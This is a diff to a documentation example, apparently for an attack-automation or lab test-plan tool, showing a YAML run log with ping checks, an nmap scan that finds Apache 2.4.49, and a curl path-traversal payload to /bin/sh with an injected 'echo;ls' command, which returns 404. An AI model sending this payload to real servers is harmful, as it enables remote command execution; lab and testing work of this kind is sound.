@@ -159,8 +159,8 @@ Example:
 
 ```yaml
 plan_name: my_plan
-timestamp: '20260209_103100'
-total_time: 3.94
+timestamp: '20260223_104459'
+total_time: 11.76
 final_result: Fail
 steps:
   need:
@@ -168,17 +168,36 @@ steps:
     steps:
       1:
         type: action
-        action: testr2
+        action: testping
         machine: kali
         expected: Success
         result: Success
-        time: 0.33
+        time: 2.19
         commands:
           1:
-            command: echo "test r2"
-            expected: test r2
-            output: test r2
-            command_time: 0.15
+            command: ping -c 3 192.168.3.10
+            expected: 3 received
+            output: 'PING 192.168.3.10 (192.168.3.10) 56(84) bytes of data.
+
+              64 bytes from 192.168.3.10: icmp_seq=1 ttl=61 time=5.90 ms
+
+              64 bytes from 192.168.3.10: icmp_seq=2 ttl=61 time=2.57 ms
+
+              64 bytes from 192.168.3.10: icmp_seq=3 ttl=61 time=1.95 ms
+
+
+              --- 192.168.3.10 ping statistics ---
+
+              3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+
+              rtt min/avg/max/mdev = 1.947/3.471/5.902/1.737 ms'
+            command_time: 2.1
+            result: Success
+          2:
+            command: echo 'test'
+            expected: test
+            output: test
+            command_time: 0.09
             result: Success
   actions:
     success: false
@@ -189,18 +208,75 @@ steps:
         machine: kali
         expected: Success
         result: Fail
-        time: 3.51
+        time: 9.56
         commands:
           1:
             operator: AND
-            group_time: 3.51
-            group_result: Fail
+            group_time: 7.29
+            group_result: Success
             1a:
               command: nmap -sV 192.168.2.10 | fgrep 'Apache' | awk '/open/'
               expected: Apache
-              output: ''
-              command_time: 3.51
-              result: Fail
+              output: 80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+              command_time: 7.2
+              result: Success
+            1b:
+              command: echo 'test kali'
+              expected: test kali
+              output: test kali
+              command_time: 0.09
+              result: Success
+          2:
+            call: testping
+            expected: Success
+            result: Success
+            action_time: 2.17
+            commands:
+              1:
+                command: ping -c 3 192.168.2.10
+                expected: 3 received
+                output: 'PING 192.168.2.10 (192.168.2.10) 56(84) bytes of data.
+
+                  64 bytes from 192.168.2.10: icmp_seq=1 ttl=61 time=3.97 ms
+
+                  64 bytes from 192.168.2.10: icmp_seq=2 ttl=61 time=2.20 ms
+
+                  64 bytes from 192.168.2.10: icmp_seq=3 ttl=61 time=2.83 ms
+
+
+                  --- 192.168.2.10 ping statistics ---
+
+                  3 packets transmitted, 3 received, 0% packet loss, time 2002ms
+
+                  rtt min/avg/max/mdev = 2.196/3.000/3.971/0.734 ms'
+                command_time: 2.09
+                result: Success
+              2:
+                command: echo 'test'
+                expected: test
+                output: test
+                command_time: 0.08
+                result: Success
+          3:
+            command: curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+              -d 'A=|echo;ls'
+            expected: bash
+            output: '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+              <html><head>
+
+              <title>404 Not Found</title>
+
+              </head><body>
+
+              <h1>Not Found</h1>
+
+              <p>The requested URL was not found on this server.</p>
+
+              </body></html>'
+            command_time: 0.1
+            result: Fail
+
 ```
 
 ### Plan-Level Fields
